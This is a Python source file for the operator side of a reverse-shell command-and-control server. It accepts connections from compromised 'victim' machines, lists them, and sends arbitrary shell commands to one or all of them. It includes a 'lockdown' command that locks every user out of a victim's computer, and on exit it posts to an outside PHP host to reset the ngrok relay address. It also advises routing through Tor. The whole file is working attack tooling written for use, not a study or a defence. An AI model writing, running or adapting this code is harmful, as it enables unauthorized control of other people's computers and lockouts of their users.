from time import sleep
import socket
import sys,os
import threading
from queue import Queue
import urllib.request
import urllib.parse
NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
history={}
first_dir={}
all_connections = []
all_addresses = []
c='''
██ 
 ██ 
  ██ 
 ██  
██    ███████            
'''
print(c+"\n[*] DON'T FORGET TO USE TOR BEFORE CONNECTING\n\n")
host=str(input('[*] Enter your host [0.0.0.0]')) or "0.0.0.0"
port=int(input('[*] Enter your port '))
#i=str(input('[*] Enter IP of ngrok [0.tcp.ngrok.io]')) or "0.tcp.ngrok.io"
#p=int(input('[*] Enter port of ngrok '))
#data = urllib.parse.urlencode({'ip':i,'port': p})
#data = data.encode('utf-8')
#request = urllib.request.Request("http://cvmun.000webhostapp.com/test.php")
#request.add_header("Content-Type","application/x-www-form-urlencoded;charset=utf-8")
#f = urllib.request.urlopen(request, data)
# Create socket
def socket_create():
    try:
        global s
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error as msg:
        print("[*] Socket creation error : " + str(msg))

# Bind socket to port and wait for client
def socket_bind():
    try:
        global host
        global port
        global s
        s.bind((host, port))
        s.listen(30)
    except socket.error as msg:
        print("[*] Socket binding error : " + str(msg) + '\n' + "Retrying...")
        socket_bind()
# Accept connections from multiple clients and save to list
def accept_connections():
    for c in all_connections:
        c.close()
    del all_connections[:]
    del all_addresses[:]
    while True:
        try:
            conn, address = s.accept()
            all_connections.append(conn)
            all_addresses.append(address)
        except:
            print("[*] Error in accepting connections")
import struct
def recv_msg(sock):
    raw_msglen = recvall(sock, 4)
    if not raw_msglen:
        return None
    msglen = struct.unpack('>I', raw_msglen)[0]
    return recvall(sock, msglen)

def recvall(sock, n):
    data = bytearray()
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data.extend(packet)
    return data
def multi_clients(l,cmd):
    global history
    client_r=''
    if l==['0']:
        l=[str(a) for a in range(len(all_connections))]
    for a in l:
        target = int(a)-1
        conn = all_connections[target]
        print("[*] Connecting to " + str(all_addresses[target][0])+':'+str(all_addresses[target][1])+'['+history[all_addresses[target]][0]+']')
        try:
            conn.send(str.encode(cmd))
        except Exception as e:
            print("[*] Command could not be sent to " + str(all_addresses[target][0])+':'+str(all_addresses[target][1])+'['+history[all_addresses[target]][0]+']')
            continue
        print("[*] Command sent")
        sleep(1)
        client_r+=str(recv_msg(conn).decode('utf-8'))+'\n'
    return client_r+'\n\n'
def remove_clients(l):
    global history
    global all_connections
    global all_addresses
    client_r=''
    if l==['0']:
        l=[str(a) for a in range(len(all_connections))]
    for a in l:
        target = int(a)-1
        conn = all_connections[target]
        try:
            conn.send(str.encode('quit'))
        except Exception as e:
            print("[*] Client "+ str(all_addresses[target][0])+':'+str(all_addresses[target][1])+'['+history[all_addresses[target]][0]+']'+" could not be removed")
            continue
        print("[*] Client "+ str(all_addresses[target][0])+':'+str(all_addresses[target][1])+'['+history[all_addresses[target]][0]+']'+" removed")
        all_connections.remove(conn)
        all_addresses.remove(all_addresses[target])
        list_connections()
# Interactive promt
def start_shell():
    inp='''
----------KEY----------
list -> show all connections
select -> select a victim(used as "select <number from list>")
quit -> quit the shell and reset ip and port of ngrok
multiple -> send a command to multiple clients
remove -> remove multiple clients

shell> '''
    while True:
        try:
            cmd = input(inp)
            if cmd == 'list':
                list_connections()
            elif 'select' in cmd:
                conn = get_target(cmd)
                if conn is not None:
                    send_target_commands(conn)
            elif cmd == 'multiple':
                list_connections()
                sdf=input('[*] Select the clients seperated by spaces(0 for all clients) ')
                cm=input('[*] Enter the command ')
                print(multi_clients(sdf.split(' '),cm))
            elif cmd == 'remove':
                list_connections()
                sdf=input('[*] Select the clients seperated by spaces(0 for all clients) ')
                remove_clients(sdf.split(' '))
            elif cmd == 'quit':
                data = urllib.parse.urlencode({'ip':'127.0.0.1','port': '0001'})#reset ngrok credentials using php
                data = data.encode('utf-8')
                request = urllib.request.Request("http://cvmun.000webhostapp.com/test.php")
                request.add_header("Content-Type","application/x-www-form-urlencoded;charset=utf-8")
                f = urllib.request.urlopen(request, data)
                print("[*] See ya bitch.......")
                break
            else:
                print("[*] I can't do that shit bruh. What you smoking??")
        except Exception as e:
            print("[*] Error occured...\n"+str(e)+'\n\n')
            break

# Display all current connections
def list_connections():
    results = ''
    global s
    global first_dir
    global history
    for i, conn in enumerate(all_connections):
        try:
            if all_addresses[i] not in history.keys():
                hn=conn.recv(1048576).decode('utf-8')
                history[all_addresses[i]]=hn.split('\n')
        except:
            del all_connections[i]
            del all_addresses[i]
            continue
        hna,first_dir[conn]=history[all_addresses[i]][0],[all_addresses[i],history[all_addresses[i]][1]]
        results += str(i+1) + ')' + str(all_addresses[i][0]) +':'+str(all_addresses[i][1])+'['+hna+']'+'\n'
    print('------------Clients------------' + '\n' + results)

# Select target client
def get_target(cmd):
    global first_dir
    global history
    try:
        target = cmd.replace('select ', '')
        target = int(target)-1
        conn = all_connections[target]
        print("[*] You are now with " + str(all_addresses[target][0])+':'+str(all_addresses[target][1])+'['+history[all_addresses[target]][0]+']\n\n')
        print(first_dir[conn][1],end='')
        return conn
    except:
        print("[*] Select some shit from the given numbers. Watcha think you doing??")
        return None
# Connect with remote target client
def send_target_commands(conn):
    global history
    global first_dir
    while True:
        try:
            cmd = input()
            if not cmd:
                print('[*] Enter some command script kiddie....\n\n\n'+first_dir[conn][1],end='')
                continue
            if cmd == 'quit':
                break
            elif cmd == "lockdown":
                if input("[*] WARNING: Doing this will completely lock out all users from the victim's computer.Do you want to continue?(Y/N) ").upper() == 'Y':
                    if input("[*] This isn't a godamn play thing...Are you double triple quadruple sure?(Y/N) ").upper() == 'Y':
                        conn.send(str.encode(cmd))
                        client_response=str(recv_msg(conn).decode('utf-8'))
                        client_response+="[*] Well....That escalated quickly\n[*] But the job's done...."
                        print(client_response+'\n\n\n'+first_dir,end='')
                        continue
            conn.send(str.encode(cmd))
            client_response=str(recv_msg(conn).decode('utf-8'))
            print(client_response,end='')
            first_dir[conn][1]=client_response.split('\n\n\n')[-1]
        except Exception as e:
            print(e)
            break



# Create worker threads
def create_workers():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


# Create jobs
def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)
    queue.join()


# Do jobs
def work():
    while True:
        x = queue.get()
        if x == 1:
            socket_create()
            socket_bind()
            accept_connections()
        if x == 2:
            start_shell()
        queue.task_done()


def main():
    create_workers()
    create_jobs()
main()
